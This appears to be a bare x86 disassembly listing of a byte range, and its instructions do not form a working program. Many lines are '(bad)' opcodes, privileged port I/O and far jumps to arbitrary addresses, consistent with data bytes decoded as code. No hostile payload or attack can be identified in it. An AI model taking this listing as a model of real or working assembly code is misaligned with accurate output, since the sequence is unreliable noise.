  4179e3:	fs stc 
  4179e5:	pop    es
  4179e6:	gs pop ecx
  4179e8:	push   ss
  4179e9:	test   al,0x6c
  4179eb:	out    dx,al
  4179ec:	inc    edx
  4179ed:	je     0x417994
  4179ef:	ins    BYTE PTR es:[edi],dx
  4179f0:	cs sub eax,0xe7ae2860
  4179f6:	ds icebp 
  4179f8:	dec    ecx
  4179f9:	pop    ss
  4179fa:	xor    BYTE PTR [ecx-0x14],ch
  4179fd:	xor    bh,BYTE PTR [ecx+0x51]
  417a00:	(bad)  
  417a01:	imul   edx,ebp,0xffffff8c
  417a04:	repz (bad) 
  417a06:	popa   
  417a07:	pop    esi
  417a08:	pop    es
  417a09:	nop
  417a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a0b:	pop    edx
  417a0c:	leave  
  417a0d:	jle    0x417a4b
  417a0f:	push   es
  417a10:	adc    bh,BYTE PTR [esi+0x2b9ed940]
  417a16:	inc    BYTE PTR [ebx+0x68731587]
  417a1c:	cmp    eax,0x70b55939
  417a21:	jne    0x417a35
  417a23:	in     eax,0xff
  417a25:	and    BYTE PTR [ecx-0x787f59d1],dh
  417a2b:	pop    ds
  417a2c:	in     eax,0x8
  417a2e:	cmpps  xmm2,XMMWORD PTR [ebx+0x50],0xda
  417a33:	pusha  
  417a34:	repnz mov edx,0x5fc642e9
  417a3a:	int3   
  417a3b:	add    dl,dl
  417a3d:	xor    al,0x24
  417a3f:	push   ebp
  417a40:	imul   edx,DWORD PTR ds:0x8b51b5dd,0xffffffd1
  417a47:	bound  ecx,QWORD PTR [ecx+eax*2-0x18932c7e]
  417a4e:	lock sbb al,0x53
  417a51:	xor    BYTE PTR [ecx],ah
  417a53:	adc    bl,BYTE PTR [esi+0x50c17eac]
  417a59:	popa   
  417a5a:	mov    DWORD PTR ds:0x1b599231,ebx
  417a60:	cmp    dl,BYTE PTR [esi]
  417a62:	mov    ds:0x5c734633,al
  417a67:	fsubr  DWORD PTR [edx+0x46]
  417a6a:	pop    ecx
  417a6b:	inc    ebp
  417a6c:	adc    ebp,ecx
  417a6e:	mov    ss,WORD PTR [edi+0x1e]
  417a71:	push   esp
  417a72:	sbb    DWORD PTR [edi-0x7bc41cae],edx
  417a78:	sub    DWORD PTR [edx+eax*2],ebx
  417a7b:	pop    edi
  417a7c:	mov    edx,0x36d3bcfd
  417a81:	inc    edi
  417a82:	and    DWORD PTR [edi+0xac33c59],0xffffffe5
  417a89:	jecxz  0x417aa2
  417a8b:	adc    esi,eax
  417a8d:	shl    BYTE PTR [ebx-0x24],cl
  417a90:	push   edx
  417a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a92:	repz call 0x8f0727a3
  417a98:	push   esi
  417a99:	or     BYTE PTR ds:0xb7d3,dh
  417a9e:	and    DWORD PTR [ecx+0x6cfe36a0],ebp
  417aa4:	call   0xb92ed01b
  417aa9:	in     eax,0x94
  417aab:	pop    ebp
  417aac:	rcl    ah,0x92
  417aaf:	sub    BYTE PTR cs:[eax],dh
  417ab2:	loopne 0x417af2
  417ab4:	sahf   
  417ab5:	loop   0x417ada
  417ab7:	(bad)  
  417ab8:	(bad)  
  417ab9:	aad    0x3a
  417abb:	inc    esp
  417abc:	pop    edi
  417abd:	lahf   
  417abe:	enter  0xfc78,0xc2
  417ac2:	mov    ah,0x9b
  417ac4:	fwait
  417ac5:	inc    ebp
  417ac6:	cdq    
  417ac7:	cmc    
  417ac8:	mov    esp,0xb026f952
  417acd:	jmp    0x417a83
  417acf:	jl     0x417b45
  417ad1:	idiv   BYTE PTR [ebx]
  417ad3:	xor    ecx,DWORD PTR [ebx]
  417ad5:	in     eax,0x29
  417ad7:	pusha  
  417ad8:	inc    edx
  417ad9:	or     DWORD PTR [edx-0x18],eax
  417adc:	jecxz  0x417ae3
  417ade:	in     eax,dx
  417adf:	fimul  WORD PTR ds:[ebx]
  417ae2:	arpl   WORD PTR [ebx],si
  417ae4:	push   edx
  417ae5:	jle    0x417aec
  417ae7:	mov    ecx,0x4bad588
  417aec:	jno    0x417b4b
  417aee:	xlat   BYTE PTR ds:[ebx]
  417aef:	push   cs
  417af0:	lods   al,BYTE PTR ds:[esi]
  417af1:	in     eax,dx
  417af2:	pushf  
  417af3:	lods   eax,DWORD PTR ds:[esi]
  417af4:	pop    ecx
  417af5:	clc    
  417af6:	pop    ebx
  417af7:	mov    ebx,0x8218085d
  417afc:	push   eax
  417afd:	inc    ebp
  417afe:	stc    
  417aff:	adc    DWORD PTR [edi+0x531cf989],ebx
  417b05:	test   al,0x78
  417b07:	jp     0x417b25
  417b09:	sahf   
  417b0a:	fisubr DWORD PTR [esi+eiz*8+0x72]
  417b0e:	out    0x32,eax
  417b10:	sbb    al,0x9c
  417b12:	adc    DWORD PTR [esi],eax
  417b14:	dec    eax
  417b15:	shr    DWORD PTR [ebp+0x13],cl
  417b18:	lods   eax,DWORD PTR ds:[esi]
  417b19:	and    DWORD PTR [edi+0x53],eax
  417b1c:	shl    al,cl
  417b1e:	mov    bh,bl
  417b20:	leave  
  417b21:	cmp    ah,BYTE PTR [eax]
  417b23:	or     DWORD PTR [esi+0x44d30c33],0xca8af2e1
  417b2d:	sub    eax,0x730c9c63
  417b32:	mov    ch,0x26
  417b34:	inc    ecx
  417b35:	sub    dl,BYTE PTR [esi+0x30]
  417b38:	fild   WORD PTR [edx+0x3e4e313c]
  417b3e:	adc    al,0x5b
  417b40:	pop    ds
  417b41:	pop    es
  417b42:	icebp  
  417b43:	xor    bh,ah
  417b45:	stos   DWORD PTR es:[edi],eax
  417b46:	push   es
  417b47:	push   ebx
  417b48:	and    eax,0x59aa49e5
  417b4d:	adc    eax,ecx
  417b4f:	ficom  DWORD PTR [ebp+0x26636ae0]
  417b55:	xor    al,0x11
  417b57:	sahf   
  417b58:	add    DWORD PTR [ebx+ebx*1+0x6de3d726],edi
  417b5f:	xchg   ecx,eax
  417b60:	mov    ds:0x6173879b,eax
  417b65:	pop    esi
  417b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b67:	(bad)  
  417b68:	xchg   ecx,eax
  417b69:	paddd  mm7,mm6
  417b6c:	(bad)  
  417b6d:	ins    BYTE PTR es:[edi],dx
  417b6e:	push   ebx
  417b6f:	sbb    al,0xa5
  417b71:	sti    
  417b72:	push   esp
  417b73:	jns    0x417be6
  417b75:	dec    ebp
  417b76:	fsubp  st(0),st
  417b78:	in     eax,dx
  417b79:	mov    al,0x1c
  417b7b:	or     eax,0xd5c8b93
  417b80:	pop    esp
  417b81:	mov    al,ds:0xb0355d79
  417b86:	fwait
  417b87:	stos   BYTE PTR es:[edi],al
  417b88:	add    eax,0x72cd92d3
  417b8d:	idiv   BYTE PTR [ebx-0x8d28e4d]
  417b93:	pop    ecx
  417b94:	scas   al,BYTE PTR es:[edi]
  417b95:	or     al,0xbc
  417b97:	xchg   esp,eax
  417b98:	mov    eax,0xe6548c93
  417b9d:	dec    esi
  417b9e:	pop    ds
  417b9f:	dec    ebp
  417ba0:	fimul  WORD PTR ds:0xaf519f78
  417ba6:	std    
  417ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba8:	test   eax,0x4e3eb9b4
  417bad:	(bad)  
  417bae:	repz fstp QWORD PTR [ebp-0x37]
  417bb2:	inc    ebx
  417bb3:	(bad)  
  417bb4:	jmp    0x7c4f:0xe02c74c3
  417bbb:	fs push cs
  417bbd:	push   esp
  417bbe:	mov    bl,0x25
  417bc0:	xor    DWORD PTR [esp+ebp*8-0x3ae68e68],edi
  417bc7:	jl     0x417b5f
  417bc9:	cmp    dl,dl
  417bcb:	fs ja  0x417b4f
  417bce:	test   DWORD PTR [edi-0x45],ebp
  417bd1:	mov    cl,BYTE PTR [edx-0x13]
  417bd4:	dec    ebp
  417bd5:	push   ebx
  417bd6:	aad    0x49
  417bd8:	xlat   BYTE PTR ds:[ebx]
  417bd9:	xor    eax,0x865474f0
  417bde:	xchg   ebx,eax
  417bdf:	and    cl,dh
  417be1:	pusha  
  417be2:	popf   
  417be3:	push   ebx
  417be4:	mov    esi,0x158e5dbe
  417be9:	test   BYTE PTR [ebx],0xf7
  417bec:	mov    ds:0xba02644f,al
  417bf1:	xchg   ebx,eax
  417bf2:	(bad)  
  417bf3:	mov    ch,0x79
  417bf5:	xor    bl,dl
  417bf7:	repnz clc 
  417bf9:	xchg   esi,eax
  417bfa:	push   esp
  417bfb:	xchg   ecx,eax
  417bfc:	pop    esp
  417bfd:	inc    esi
  417bfe:	jmp    0xd9cb:0x3d99a7e5
  417c05:	add    DWORD PTR [esi],esp
  417c07:	mov    ah,0x7c
  417c09:	lods   eax,DWORD PTR ds:[esi]
  417c0a:	(bad)  
  417c0b:	or     eax,0xf5a2da8f
  417c10:	xor    al,0xdd
  417c12:	push   es
  417c13:	push   0xeaaaac9b
  417c18:	jnp    0x417c5e
  417c1a:	xchg   DWORD PTR [edi-0x13e585e4],ebx
  417c20:	leave  
  417c21:	sub    esi,ebx
  417c23:	ins    BYTE PTR es:[edi],dx
  417c24:	xor    DWORD PTR [ebx-0x59a0b2e2],0xffffffbe
  417c2b:	jns    0x417bdc
  417c2d:	push   eax
  417c2e:	ja     0x417c63
  417c30:	sbb    DWORD PTR [ebx+eax*1],eax
  417c33:	dec    esi
  417c34:	add    ecx,DWORD PTR [ebp-0x17d5b12b]
  417c3a:	call   0xa77d478b
  417c3f:	sub    DWORD PTR [ecx+0xefa0707],ebp
  417c45:	lock fs push cs
  417c48:	xchg   bh,dl
  417c4a:	shl    BYTE PTR [ebx],0xd9
  417c4d:	push   ebx
  417c4e:	cdq    
  417c4f:	fadd   DWORD PTR [ecx+0x3050b755]
  417c55:	pop    esi
  417c56:	mov    eax,0x8e0614fc
  417c5b:	inc    eax
  417c5c:	(bad)  
  417c5d:	mov    ebp,0xf6c32dd
  417c62:	ja     0x417bec
  417c64:	mov    esp,ecx
  417c66:	in     al,dx
  417c67:	mov    al,ds:0x4a650a14
  417c6c:	fmul   DWORD PTR [esi*1-0x7ad0aa67]
  417c73:	push   esp
  417c74:	int3   
  417c75:	(bad)  
  417c76:	mov    al,0x53
  417c78:	dec    esp
  417c79:	cs (bad) 
  417c7b:	loopne 0x417cf8
  417c7d:	data16 mov dh,0x5
  417c80:	pop    eax
  417c81:	shr    BYTE PTR [edi+0x1afdadac],cl
  417c87:	sub    eax,edi
  417c89:	pop    esp
  417c8a:	lods   al,BYTE PTR ds:[esi]
  417c8b:	adc    al,0xd
  417c8d:	mov    ds:0x7e2ee231,al
  417c92:	repnz in eax,dx
  417c94:	enter  0xc98c,0x8a
  417c98:	mov    ebx,0xdff992e5
  417c9d:	retf   0xec55
  417ca0:	mov    DWORD PTR [esi-0x797bd292],esp
  417ca6:	sub    ecx,DWORD PTR [edi+0x22]
  417ca9:	mov    edx,0x414d77cc
  417cae:	retf   0x4e84
  417cb1:	inc    eax
  417cb2:	sbb    BYTE PTR [edi+0x25],0x26
  417cb6:	mov    eax,0x41ae337e
  417cbb:	mov    ebp,0x62a35497
  417cc0:	dec    ebx
  417cc1:	jae    0x417d09
  417cc3:	jp     0x417d2a
  417cc5:	in     eax,dx
  417cc6:	sbb    BYTE PTR [edi-0x1e],dh
  417cc9:	dec    edx
  417cca:	jecxz  0x417d32
  417ccc:	popa   
  417ccd:	(bad)  
  417cce:	xchg   ebp,eax
  417ccf:	add    bh,BYTE PTR [eax+edi*1-0x66070fb2]
  417cd6:	push   es
  417cd7:	gs cmp edi,esi
  417cda:	fcomp  DWORD PTR ds:0xaf229143
  417ce0:	int    0xb6
  417ce2:	push   edi
  417ce3:	out    0xab,al
  417ce5:	cld    
  417ce6:	add    sp,WORD PTR [eax]
  417ce9:	sar    BYTE PTR [edx-0x51],cl
  417cec:	xchg   esp,eax
  417ced:	and    cl,0x24
  417cf0:	mov    ecx,0xe70e4fa
  417cf5:	fdivr  DWORD PTR [edi]
  417cf7:	outs   dx,BYTE PTR ds:[esi]
  417cf8:	fwait
  417cf9:	rol    ah,0x95
  417cfc:	(bad)  
  417cfd:	mov    BYTE PTR [edi-0x6a],ah
  417d00:	pop    es
  417d01:	jecxz  0x417d3d
  417d03:	aaa    
  417d04:	or     al,0xc4
  417d06:	mov    al,0x0
  417d08:	sbb    DWORD PTR [esi-0xcaff8f3],esp
  417d0e:	pop    esp
  417d0f:	cmp    BYTE PTR [eax],bl
  417d11:	push   cs
  417d12:	xchg   esp,eax
  417d13:	dec    esi
  417d14:	or     BYTE PTR [edi],bh
  417d16:	mov    dl,0x6e
  417d18:	(bad)  
  417d19:	ja     0x417d2f
  417d1b:	int    0x8a
  417d1d:	ret    
  417d1e:	ds sub eax,0x2e7237ca
  417d24:	pop    edi
  417d25:	aam    0x89
  417d27:	pop    ebx
  417d28:	sub    DWORD PTR [eax],ecx
  417d2a:	push   0xa2ac3cb7
  417d2f:	cld    
  417d30:	mov    edx,0xd785750a
  417d35:	imul   DWORD PTR [ecx+ecx*1]
  417d38:	push   edx
  417d39:	mov    ch,0x5a
  417d3b:	sub    al,ch
  417d3d:	xchg   ebx,eax
  417d3e:	inc    ebp
  417d3f:	aaa    
  417d40:	xchg   edx,eax
  417d41:	mov    es,WORD PTR [ebx]
  417d43:	inc    eax
  417d44:	sbb    BYTE PTR [esi-0x7106ae82],al
  417d4a:	retf   
  417d4b:	cdq    
  417d4c:	test   al,0x17
  417d4e:	xchg   edx,eax
  417d4f:	xchg   DWORD PTR [ebx-0x6c],ecx
  417d52:	test   DWORD PTR [ebx+0x60b29519],esi
  417d58:	or     al,0x74
  417d5a:	ret    0xd352
  417d5d:	dec    edx
  417d5e:	test   eax,0xcfe256e2
  417d63:	clc    
  417d64:	in     al,dx
  417d65:	push   cs
  417d66:	mov    dl,al
  417d68:	ror    ah,0x52
  417d6b:	mov    edi,0x97dec69e
  417d70:	in     eax,0x24
  417d72:	aad    0xea
  417d74:	push   ds
  417d75:	ds dec eax
  417d77:	cs pop esp
  417d79:	mov    ds:0x3905ba94,eax
  417d7e:	jb     0x417d0f
  417d80:	in     al,dx
  417d81:	ins    DWORD PTR es:[edi],dx
  417d82:	push   eax
  417d83:	data16 sub BYTE PTR [eax+0x6fea3123],0x8d
  417d8b:	stc    
  417d8c:	dec    ebx
  417d8d:	lds    edi,FWORD PTR [ebx]
  417d8f:	int3   
  417d90:	enter  0x2b4b,0x16
  417d94:	xchg   esi,eax
  417d95:	fldcw  WORD PTR [ecx]
  417d97:	jns    0x417db1
  417d99:	(bad)  
  417d9a:	xlat   BYTE PTR ds:[ebx]
  417d9b:	lar    ecx,WORD PTR ds:0x48f3a7f0
  417da2:	adc    eax,0xe3a3c662
  417da7:	and    ah,BYTE PTR [esi]
  417da9:	js     0x417d2b
  417dab:	pop    esi
  417dac:	xor    DWORD PTR [ebx+0x52],ecx
  417daf:	int3   
  417db0:	xor    edx,DWORD PTR [eax]
  417db2:	lea    edi,[ecx+0x22]
  417db5:	rol    edi,cl
  417db7:	rcl    cl,cl
  417db9:	sar    DWORD PTR [edi],cl
  417dbb:	std    
  417dbc:	add    DWORD PTR [ecx],ebp
  417dbe:	mov    ch,BYTE PTR [ebp+0x8]
  417dc1:	sub    esp,DWORD PTR [ecx+0x62]
  417dc4:	lea    edi,[ebx+esi*4]
  417dc7:	clc    
  417dc8:	push   ebp
  417dc9:	mov    WORD PTR [esi-0xf233fe4],ss
  417dcf:	jl     0x417e05
  417dd1:	pusha  
  417dd2:	sub    eax,0xb54d6d41
  417dd7:	ret    
  417dd8:	cmp    esi,eax
  417dda:	xchg   esi,eax
  417ddb:	xchg   ecx,eax
  417ddc:	cli    
  417ddd:	jl     0x417dbe
  417ddf:	sar    DWORD PTR [ebp-0x6756ad77],1
  417de5:	cmp    BYTE PTR [edi],ch
  417de7:	dec    esp
  417de8:	shl    DWORD PTR [ebx-0x8106803],1
  417dee:	or     esp,edi
  417df0:	cwde   
  417df1:	and    BYTE PTR [eax],0xea
  417df4:	fnsave [esi-0x76209754]
  417dfa:	push   ebp
  417dfb:	jnp    0x417db9
  417dfd:	sbb    bh,cl
  417dff:	add    al,0x76
  417e01:	xor    eax,0x52c7c369
  417e06:	inc    eax
  417e07:	je     0x417de5
  417e09:	push   esi
  417e0a:	xor    bh,BYTE PTR [ebx+0xd]
  417e0d:	mov    DWORD PTR [edi-0x39a87d35],ebp
  417e13:	jae    0x417def
  417e15:	inc    ebx
  417e16:	test   dl,bh
  417e18:	pop    ss
  417e19:	inc    eax
  417e1a:	fs cli 
  417e1c:	xor    BYTE PTR [edi],0x7b
  417e1f:	sbb    eax,0xfafc69db
  417e24:	(bad)
  417e27:	fcmovnu st,st(5)
  417e29:	call   0x98e1:0xf2bee26c
  417e30:	in     al,dx
  417e31:	mov    esi,0x9ef2ecbd
  417e36:	sub    al,BYTE PTR [esi+eax*4-0x8930d6d]
  417e3d:	rcr    DWORD PTR [edi-0x41],1
  417e40:	mov    al,0xb1
  417e42:	push   cs
  417e43:	int    0x62
  417e45:	sub    BYTE PTR [edi-0x20dde58a],al
  417e4b:	sub    eax,0xface0b0a
  417e50:	repnz cmp DWORD PTR [edx+0x2a10d7fc],esi
  417e57:	mov    cl,0x2b
  417e59:	loop   0x417e1f
  417e5b:	mov    al,0xb6
  417e5d:	lahf   
  417e5e:	push   0x2e
  417e60:	mov    dh,0x45
  417e62:	or     al,0xe7
  417e64:	and    DWORD PTR [ecx-0x28],0x6a0f5880
  417e6b:	lock pop edx
  417e6d:	pop    ebx
  417e6e:	(bad)  
  417e6f:	aad    0x25
  417e71:	add    eax,0xe31e2499
  417e76:	scas   al,BYTE PTR es:[edi]
  417e77:	jl     0x417e28
  417e79:	pop    edi
  417e7a:	repnz cld 
  417e7c:	stc    
  417e7d:	xor    DWORD PTR [eax+0x23fe3bdf],0x7a699814
  417e87:	and    eax,0xcc6912ab
  417e8c:	and    ah,al
  417e8e:	sub    al,0x16
  417e90:	bound  ecx,QWORD PTR [ebx]
  417e92:	cmp    DWORD PTR [eax+0x0],edx
  417e95:	icebp  
  417e96:	mov    cl,0x76
  417e98:	or     al,0x78
  417e9b:	or     esp,DWORD PTR [ecx]
  417e9d:	sbb    eax,0xf5898631
  417ea2:	cmp    bl,BYTE PTR [edi]
  417ea4:	inc    ebx
  417ea5:	mov    ebx,0xe6b5dcac
  417eaa:	test   DWORD PTR [ecx],ebp
  417eac:	mov    eax,edx
  417eae:	push   cs
  417eaf:	push   edi
  417eb0:	icebp  
  417eb1:	adc    DWORD PTR [eax],ebx
  417eb3:	jge    0x417ed6
  417eb5:	xor    edx,DWORD PTR [eax]
  417eb7:	mov    al,ds:0xe712c83f
  417ebc:	mov    ch,0x9b
  417ebe:	push   cs
  417ebf:	mov    ebp,0xde9bbcd4
  417ec4:	jge    0x417f19
  417ec6:	leave  
  417ec7:	push   ebx
  417ec8:	ja     0x417f15
  417eca:	inc    esi
  417ecb:	les    esi,FWORD PTR [esi]
  417ecd:	mov    al,ds:0x1774b5d0
  417ed2:	inc    ebx
  417ed3:	mov    al,0xf7
  417ed5:	sbb    ebp,eax
  417ed7:	xchg   esp,eax
  417ed8:	xor    eax,0x4780f413
  417edd:	(bad)  [eax+edx*8+0x1c]
  417ee1:	mov    ch,ah
  417ee3:	lock sub eax,0x4a2046e0
  417ee9:	push   edi
  417eea:	pop    ebp
  417eeb:	mov    ch,0xc7
  417eed:	mov    cs,ecx
  417eef:	leave  
  417ef0:	sbb    eax,0xe94750a4
  417ef5:	cmp    edi,DWORD PTR [esi-0x5a6d88bf]
  417efb:	dec    edi
  417efc:	pushf  
  417efd:	sar    BYTE PTR [ecx+0x4334b90f],1
  417f03:	mov    ?,WORD PTR [ebp-0x7c00941b]
  417f09:	mov    esi,0x30d73dda
  417f0e:	push   edi
  417f0f:	lds    ebp,FWORD PTR [ebp-0x43]
  417f12:	outs   dx,BYTE PTR ds:[esi]
  417f13:	aas    
  417f14:	(bad)  
  417f15:	loop   0x417f1e
  417f17:	xchg   esp,eax
  417f18:	(bad)  [esi+0x22]
  417f1b:	push   edi
  417f1c:	jge    0x417f17
  417f1e:	jbe    0x417f88
  417f20:	jge    0x417f82
  417f22:	pusha  
  417f23:	(bad)  
  417f24:	in     eax,dx
  417f25:	mov    cl,BYTE PTR [edi+0x538bb276]
  417f2b:	cdq    
  417f2c:	sbb    DWORD PTR es:[edx+0x4feecac7],0x56dd6d59
  417f37:	jg     0x417f7b
  417f39:	push   ss
  417f3a:	ror    DWORD PTR [ebx],cl
  417f3c:	ss sub bl,0xf2
  417f40:	loope  0x417fb8
  417f42:	jae    0x417f9b
  417f44:	push   edi
  417f45:	xor    ah,BYTE PTR [esi+0x2da77623]
  417f4b:	push   edi
  417f4c:	mov    al,bh
  417f4e:	mov    edx,0x5eb5aeeb
  417f53:	mov    dl,BYTE PTR [edi+ebx*4+0x7825f0b3]
  417f5a:	outs   dx,DWORD PTR ds:[esi]
  417f5b:	ss jae 0x417f24
  417f5e:	xor    eax,0x5087093
  417f63:	stos   BYTE PTR es:[edi],al
  417f64:	pop    ds
  417f65:	aaa    
  417f66:	aam    0x70
  417f68:	push   esi
  417f69:	mov    eax,ebp
  417f6b:	inc    esi
  417f6c:	lock and DWORD PTR [ebx],esp
  417f6f:	dec    esi
  417f70:	mov    eax,0x8333a823
  417f75:	jecxz  0x417f05
  417f77:	sbb    ah,BYTE PTR [eax]
  417f79:	loop   0x417fc3
  417f7b:	(bad)
  417f7e:	lods   al,BYTE PTR ds:[esi]
  417f7f:	mov    ebp,0x6d47efbb
  417f84:	loop   0x417f11
  417f86:	inc    ebx
  417f87:	ret    
  417f88:	jns    0x417f53
  417f8a:	push   0xc6a341e8
  417f8f:	jle    0x417f86
  417f91:	sub    DWORD PTR [ecx+0x74],eax
  417f94:	pop    ds
  417f95:	jbe    0x417f75
  417f97:	mov    dh,0x9e
  417f99:	mov    bh,0xb6
  417f9b:	in     al,dx
  417f9c:	mov    WORD PTR [ecx],?
  417f9e:	mov    ecx,0x7f7cbea1
  417fa3:	div    bh
  417fa5:	add    DWORD PTR cs:[esi-0x10892b21],ecx
  417fac:	cmp    al,0x33
  417fae:	call   0x665a1fab
  417fb3:	les    esp,FWORD PTR gs:[eax+0x7e]
  417fb7:	inc    esp
  417fb8:	movhps xmm7,QWORD PTR ds:0x9f43d31f
  417fbf:	pusha  
  417fc0:	imul   esi,DWORD PTR [ecx],0xf73b906e
  417fc6:	add    bl,BYTE PTR [esi+0x4b85418c]
  417fcc:	adc    al,0x1e
  417fce:	xlat   BYTE PTR ds:[ebx]
  417fcf:	ss xor al,0x4c
  417fd2:	sbb    eax,0x4ea809d5
  417fd7:	sub    bl,BYTE PTR [esi+0x13]
  417fda:	fs push edi
  417fdc:	dec    esp
  417fdd:	push   eax
  417fde:	aaa    
  417fdf:	push   0x63
  417fe1:	xchg   esi,eax
  417fe2:	clc    
  417fe3:	(bad)  
  417fe5:	xor    DWORD PTR [ebp+0x46],esi
  417fe8:	xor    ecx,DWORD PTR [edi]
  417fea:	call   0xf6c9:0x624b9fcc
  417ff1:	fmulp  st(6),st
  417ff3:	push   eax
  417ff4:	call   0x9a5b:0xd25493c8
  417ffb:	xlat   BYTE PTR ds:[ebx]
  417ffc:	repz sbb ah,ch
  417fff:	dec    esi
  418000:	jmp    0x5565:0x1e526203
  418007:	adc    bl,0xca
  41800a:	scas   eax,DWORD PTR es:[edi]
  41800b:	dec    ebp
  41800c:	inc    ah
  41800e:	and    BYTE PTR [esi],ch
  418010:	sub    al,BYTE PTR [edi+0x2e]
  418013:	in     al,0x18
  418015:	and    eax,0xa880a851
  41801a:	jmp    0x2b65:0xccc24835
  418021:	and    dh,bh
  418023:	scas   eax,DWORD PTR es:[edi]
  418024:	(bad)  
  418025:	cmp    eax,0xbd682ce
  41802a:	outs   dx,DWORD PTR ds:[esi]
  41802b:	jge    0x417fb3
  41802d:	add    eax,0xf7779300
  418032:	jle    0x418089
  418034:	fsub   DWORD PTR [edx]
  418036:	pushf  
  418037:	adc    eax,0x96bf6aa8
  41803c:	cdq    
  41803d:	jbe    0x4180a0
  41803f:	jb     0x417ffb
  418041:	mov    dl,0x8
  418043:	test   al,0x33
  418045:	mov    dh,0x51
  418047:	out    0x4d,al
  418049:	xor    eax,esi
  41804b:	or     BYTE PTR [edx-0x6caf7ae4],al
  418051:	ins    BYTE PTR es:[edi],dx
  418052:	and    ah,BYTE PTR [ecx]
  418054:	fstp   TBYTE PTR [ebx-0x54194fa4]
  41805a:	add    eax,0xc9af4224
  41805f:	inc    esp
  418060:	in     al,0xb
  418062:	or     BYTE PTR ds:[esi-0x1b],al
  418066:	mov    eax,0x8ff86873
  41806b:	cli    
  41806c:	sti    
  41806d:	and    esi,ebp
  41806f:	push   0xa5f83e03
  418074:	add    edi,0x30b384f7
  41807a:	xchg   ecx,eax
  41807b:	fcomp  DWORD PTR [ebx]
  41807d:	jmp    0x418001
  41807f:	scas   al,BYTE PTR es:[edi]
  418080:	push   es
  418081:	inc    edx
  418082:	enter  0x7e8c,0xc1
  418086:	or     al,0x5b
  418088:	fstp   DWORD PTR [esi]
  41808a:	cli    
  41808b:	daa    
  41808c:	push   ecx
  41808d:	out    0x60,al
  41808f:	fidiv  DWORD PTR [esi+0x25481a97]
  418095:	pop    edi
  418096:	popf   
  418097:	sti    
  418098:	in     al,dx
  418099:	xor    edx,eax
  41809b:	out    dx,eax
  41809c:	dec    ebp
  41809d:	addr16 mov dl,0xe3
  4180a0:	scas   al,BYTE PTR es:[edi]
  4180a1:	inc    BYTE PTR [esi]
  4180a3:	dec    eax
  4180a4:	fsub   DWORD PTR [edi+0x7632a9e1]
  4180aa:	ds jb  0x4180ef
  4180ad:	std    
  4180ae:	push   esi
  4180af:	daa    
  4180b0:	iret   
  4180b1:	out    0xd0,al
  4180b3:	mov    eax,ds:0x5016aa6a
  4180b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180b9:	arpl   WORD PTR [ebp+0x39c63516],si
  4180bf:	adc    edi,DWORD PTR [ebx-0x7d46eb8b]
  4180c5:	xchg   DWORD PTR [ecx+0x1a],eax
  4180c8:	nop
  4180c9:	inc    ebx
  4180ca:	jbe    0x418065
  4180cc:	pop    ds
  4180cd:	cmp    al,0x65
  4180cf:	rol    DWORD PTR cs:[edi+0x3595dfc6],1
  4180d6:	push   ss
  4180d7:	pop    ds
  4180d8:	lods   al,BYTE PTR ds:[esi]
  4180d9:	jp     0x4180a1
  4180db:	scas   al,BYTE PTR es:[edi]
  4180dc:	sub    al,0x24
  4180de:	in     eax,dx
  4180df:	cmp    esp,DWORD PTR [edx+0x78b5c974]
  4180e5:	into   
  4180e6:	push   edi
  4180e7:	or     al,0x67
  4180e9:	inc    ecx
  4180ea:	(bad)  
  4180eb:	jbe    0x4180af
  4180ed:	outs   dx,BYTE PTR ds:[esi]
  4180ee:	stos   DWORD PTR es:[edi],eax
  4180ef:	dec    ebx
  4180f0:	mov    al,ds:0xb723058f
  4180f5:	inc    esp
  4180f6:	das    
  4180f7:	xchg   esi,eax
  4180f8:	scas   al,BYTE PTR es:[edi]
  4180f9:	pop    ds
  4180fa:	adc    eax,DWORD PTR [edx]
  4180fc:	add    al,0xd7
  4180fe:	loopne 0x4180c8
  418100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418101:	inc    ebx
  418102:	jne    0x41817f
  418104:	pop    esp
  418105:	jge    0x418184
  418107:	xchg   esp,eax
  418108:	cmp    al,0x26
  41810a:	pusha  
  41810b:	mov    edx,0xe0cd3d28
  418110:	sub    DWORD PTR [edi-0x4dad06e1],ebp
  418116:	sub    ebp,DWORD PTR [ebx-0x783d10b9]
  41811c:	inc    ebp
  41811d:	outs   dx,DWORD PTR ds:[esi]
  41811e:	or     eax,0xd21a50dd
  418123:	test   DWORD PTR [edx+eax*8-0x15],edx
  418127:	call   0x337a89d2
  41812c:	mov    esi,0x31044413
  418131:	ja     0x418121
  418133:	ret    0xef6a
  418136:	scas   al,BYTE PTR es:[edi]
  418137:	fnsave [edi+0x35]
  41813a:	add    ebp,DWORD PTR [ebx]
  41813c:	lods   eax,DWORD PTR ds:[esi]
  41813d:	fcmovb st,st(1)
  41813f:	out    0x34,al
  418141:	int3   
  418142:	scas   al,BYTE PTR es:[edi]
  418143:	inc    edx
  418144:	cli    
  418145:	dec    edx
  418146:	inc    edi
  418147:	adc    ebp,esi
  418149:	push   ebp
  41814a:	adc    ah,BYTE PTR [ebp+0x1a62ae4b]
  418150:	int    0x10
  418152:	xor    al,0x3e
  418154:	int    0x28
  418156:	xor    eax,0x2a4489d4
  41815b:	fs inc ebx
  41815d:	lea    ebx,[ebx+0x84dab72]
  418163:	(bad)  [ecx]
  418165:	shr    dl,0xe1
  418168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418169:	sub    BYTE PTR [edi-0x35],dl
  41816c:	ins    BYTE PTR es:[edi],dx
  41816d:	or     edi,DWORD PTR ds:0xeb7bd2bc
  418173:	into   
  418174:	or     BYTE PTR [ebx+ebx*8-0x51],ch
  418178:	jl     0x41811c
  41817a:	mov    ebx,0xddb48782
  41817f:	mov    ecx,0x4f625b99
  418184:	jb     0x418111
  418186:	xchg   ebp,eax
  418187:	(bad)  
  418188:	and    al,0x45
  41818a:	dec    edi
  41818b:	mov    gs,WORD PTR [ebx+ebp*2]
  41818e:	adc    bl,BYTE PTR [ebx]
  418190:	mov    eax,0xfa7c9d5d
  418195:	dec    ecx
  418196:	mov    DWORD PTR [ecx-0x39],edx
  418199:	fdivp  st(1),st
  41819b:	adc    edi,ebp
  41819d:	and    esi,DWORD PTR [edi]
  41819f:	leave  
  4181a0:	retf   
  4181a1:	jne    0x418196
  4181a3:	sahf   
